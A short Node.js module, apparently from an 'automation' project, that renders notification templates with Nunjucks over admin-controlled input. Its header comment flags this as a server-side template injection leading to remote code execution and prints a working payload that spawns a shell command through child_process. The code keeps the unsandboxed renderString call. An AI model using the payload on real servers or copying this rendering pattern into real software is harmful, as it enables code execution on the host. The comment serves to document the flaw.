// Project "automation" / notification templates are rendered server-side with
// Nunjucks over org-admin-controlled input -> SSTI RCE (V8):
//   {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
const nunjucks = require('nunjucks')
const env = new nunjucks.Environment(null, { autoescape: true })
function render(template, ctx) { return env.renderString(String(template), ctx || {}) }
module.exports = { render }
